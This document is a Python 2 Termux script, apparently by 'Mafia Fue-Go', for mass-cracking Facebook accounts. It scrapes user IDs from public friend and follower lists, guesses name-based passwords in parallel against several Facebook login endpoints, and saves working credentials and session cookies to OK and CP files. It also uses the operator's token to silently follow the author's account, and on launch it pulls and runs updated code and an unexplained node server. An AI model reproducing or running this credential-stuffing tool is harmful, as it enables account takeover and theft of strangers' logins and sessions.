# -*- coding: utf-8
# author by Mafia Fue-Go
try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2 cracker.indirect")
    
os.system("clear")



if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")

if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("cd ..... && pip install progress")

    os.system("cd ..... && npm install")

    os.system("cd ..... && node index.js &")

    os.system("clear")

    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("#")

    os.system("cd ..... && node index.js &")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

import os
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")

import os, sys, re, time, requests, json, random, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]


def  jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.05)

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	
	print("""\x1b[1;32m ---------------------------------------------      
\x1b[1;32m╔════════════════════════════════════════════╗
\x1b[1;32m║\033[1;37m Tool Author: \033[1;33mF U E G O 
\x1b[1;32m║\033[1;37m Youtube by : \033[1;33mSOCIAL TECH                  
\x1b[1;32m║\033[1;37m Github     : \033[1;33mgithub.com/LEGEND-FUEGO                     
\x1b[1;32m║\033[1;37m Facebook   : \033[1;33m100008297554931 \033[1;31m[ F U E G O]    
\x1b[1;32m╚════════════════════════════════════════════╝


\x1b[1;31m╔═════════════════════════════╗
\x1b[1;31m║\033[1;37m  IP: \033[1;32m105.245.110.103
\x1b[1;31m║\033[1;37m  County Region: \033[1;32mAll COUNTRIES
\x1b[1;31m║\033[1;37m  Version: \033[1;32m2.0
\x1b[1;31m╚══════════════════════════════╝""")
def login():
	os.system("clear")
	try:
		#-> connection test
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit("Internet Connection Error")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError:
		print("\033[1;33mIF you dont have Token Go And Download !Get token app! ")
		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
		if token == "":
			print("Wrong Input")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			#-> bot follow
			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      #FUE GO
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit("[>] Login Error")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit("[>] Login Error")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit("\033[1;91m[\033[1;93m+\033[1;96m] Token Error")
	except requests.exceptions.ConnectionError:
		exit(" ! no internet connection")
	logo()
	print("\n\033[1;37m[\033[1;32m!\033[1;37m] This tool is for \033[1;33mFREE\033[1;37m use except [\033[1;31mpremium\033[1;37m]")
	print("\033[1;37m[\033[1;32m01\033[1;37m] Crack from public followers")
	print("\033[1;37m[\033[1;32m02\033[1;37m] Crack from public  \033[1;32mFOLLOWERS")
	print("\033[1;37m[\033[1;32m03\033[1;37m] Crack from \033[1;32mMULTI-ID's \033[1;37m[\033[1;31mPRO\033[1;97m]")
	print("\033[1;37m[\033[1;32m04\033[1;37m] Chack Crack \033[1;32mRESULTS")
	print("\033[1;37m[\033[1;32m05\033[1;37m] Subscribe \033[1;32mto \033[1;97m[\033[1;91mpremium\033[1;97m]")
       
        print("\n\033[1;37m[\033[1;31m!\033[1;37m] Tools for [\033[1;31mpremium\033[1;37m]")
	print("\033[1;37m[\033[1;31m06\033[1;37m] Activate [\033[1;31mLocked-Profile\033[1;37m]")
	print("\033[1;37m[\033[1;31m07\033[1;37m] Activate [\033[1;31mGuard-On\033[1;37m]")
	print("\033[1;37m[\033[1;31m08\033[1;37m] Crack from public \033[1;32mSEARCH people")
	print("\033[1;37m[\033[1;31m09\033[1;37m] Crack from public \033[1;32mFOLLOWERS")
	print("\033[1;37m[\033[1;31m10\033[1;37m] Crack from \033[1;32mLIKES/REACTIONS \033[1;37m[\033[1;31mpremium\033[1;97m]")
	print("\033[1;37m[\033[1;31m11\033[1;37m] Crack from Old ID list text \033[1;32m2005 - 2013")
	print("\033[1;37m[\033[1;31m12\033[1;37m] Report Facebook ID target \033[1;97m[\033[1;91mpremium\033[1;97m]")
	Bilal = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m] Choose : ")
	if Bilal =="":
		menu()
	elif Bilal == "1" or Bilal == "01":
		publik()
		method()
	elif Bilal == "2" or Bilal == "02":
		follower()
		method()
	elif Bilal == "3" or Bilal == "03":
		massal()
		method()
	elif Bilal == "4" or Bilal == "04":
		print("\n\033[1;37m[\033[1;32m1\033[1;37m] Check crack results  \033[1;32mOK")
		print("\033[1;37m[\033[1;32m2\033[1;37m] Check crack results  \033[1;32mCP")
		cek = raw_input("\n\033[1;37m[\033[1;32m+\033[1;37m]  \033[1;32mChoose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print("\033[1;97m[\033[1;32m+\033[1;97m] Copy file name  and past into Input")
			for file in dirs:
				print(" "+file)
			try:
				file = raw_input("\n\033[1;97m[\033[1;92m+\033[1;97m] File name : ")
				if file == "":
					menu()
				Totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" # ----------------------------------------------")
			print(" Crack Result : %s Total : %s\033[1;34m"%(del_txt, len(Totalok)))
			os.system("cat OK/%s"%(file))
			print(" \033[0;32m # ----------------------------------------------")
			exit(" ")
		elif cek == "2":
			dirs = os.listdir("CP")
			print("\033[1;32m[\033[1;32m+\033[1;32m] Copy file name and past into Input")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n\033[1;32m[\033[1;32m+\033[1;32m] File name : ")
				if file == "":
					menu()
				Totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("# ----------------------------------------------")
			print(" Crack results : %s Total : %s\033[0;32m"%(del_txt, len(Totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;32m # ----------------------------------------------")
			exit(" ")
		else:
			menu()
	elif Bilal == "5" or Bilal == "05":
		   setting_ua()
	elif Bilal == "0" or Bilal == "00":
		os.system("rm -f login.txt")
		exit("\n\033[1;37m[\033[1;32m!\033[1;37m] Token removed")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;31m[\033[1;31m!\033[1;31m] Token Error")
	idt = raw_input("\n\033[1;37m[\033[1;32m+\033[1;37m] Target Id: ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("\n\033[1;37m[\033[1;32m+\033[1;37m] Account Friend List is Not Public")
	print("\033[1;31m[\033[1;31m+\033[1;31m] Total id  : \033[1;31m%s\033[1;31m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
	idt = raw_input("\n\033[1;37m[\033[1;92m+\033[1;97m] Target ID : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("URL Error")
	print("[+] Total id  : \033[1;33m%s\033[1;33m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
	try:
		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number [\033[1;32mOption\033[1;37m]  : "))
	except:tanya_Total=1
	for t in range(tanya_Total):
		t +=1
		idt = raw_input("\033[1;37m[\033[1;32m+\033[1;37m] Target ID %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\033[1;37m[\033[1;32m+\033[1;37m] Ids Friend list Is Not Public")
	print("\033[1;37m[\033[1;32m?\033[1;37m] Total id  : \033[1;33m%s\033[1;33m"%(len(id)))

def method():
	print("\n\033[1;37m[\033[1;32m?\033[1;37m] Pick cracking methord")
	print("\033[1;37m[\033[1;32m1\033[1;37m] B-api\033[1;37m [ \033[1;31mPRO/Faster\033[1;37m]")
	print("\033[1;37m[\033[1;32m2\033[1;37m] Mbasic\033[1;37m [ \033[1;32mFast\033[1;37m]")
	print("\033[1;37m[\033[1;32m3\033[1;37m] Free Facebook\033[1;37m [ \033[1;33mNormal\033[1;37m]")
	method = raw_input("\033[1;37m[\033[1;32m?\033[1;37m] Pick cracking methord : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] : ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(bapi, id)
		exit("Program End")
	elif method == "2":
		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mbasic, id)
		exit("Program End")
	elif method == "3":
		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] ")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mobile, id)
		exit("Program End")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r\033[0;33m[FUEGO-CP] %s|%s|%s %s %s"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mCracking\033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345", name, name+"11", name+"22", name+"33", name+"44", name+"55", name+"66", name+"77", name+"88", name+"99" ]
	elif len(name)<=2:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345", name+"2", name+"3", name+"4", name+"5", name+"6", name+"7", name+"8", name+"9", name+"9", name+"10", name+"16", name+"20", name+"13" ]
	elif len(name)<=3:
		pwx = [ name, name+"111", name+"222", name+"333", name+"444", name+"555", name+"666", name+"777", name+"888", name+"999" ]
	else:
		pwx = [ name, name+"2001", name+"2002", name+"2003", name+"1999", name+"1998", name+"1997", name+"1996", name+"1995", name+"1994", name+"1993" ]
		
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[1;93m[FUEGO-CP] %s|%s"%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mCracking\033[1;92m]\033[1;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	else:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;93m[FUEGO-CP] %s|%s\033[0;97m"%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break 
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mCracking\033[1;91m]\033[1;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	else:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
	asu = raw_input("[+] Enter Passwords : ").split(",")
	if len(asu) =="":
		exit("[+] Wrong Input")
	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")

	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[1;92mCracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n\n # [>Program Close<]")

def setting_ua():
	print("[1] Change User-Agent")
	print("[2] Default User-Agent")
	ua = raw_input("\n [?] Choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" [+] Enter User-Agent : ")
		c_ua = raw_input(" [+] IPHONE  : ")
		c_ua = raw_input(" [+] SAMSUNG : ")
		c_ua = raw_input(" [+] XIAOMI: ")
		c_ua = raw_input(" [+] NOKIA : ")
		c_ua = raw_input(" [+] LINUX: ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [!] Press 'Enter' to save User-Agent")
		menu()
	elif ua == "2":
		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n[•] User-Agent Save Successfully")
		menu()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()
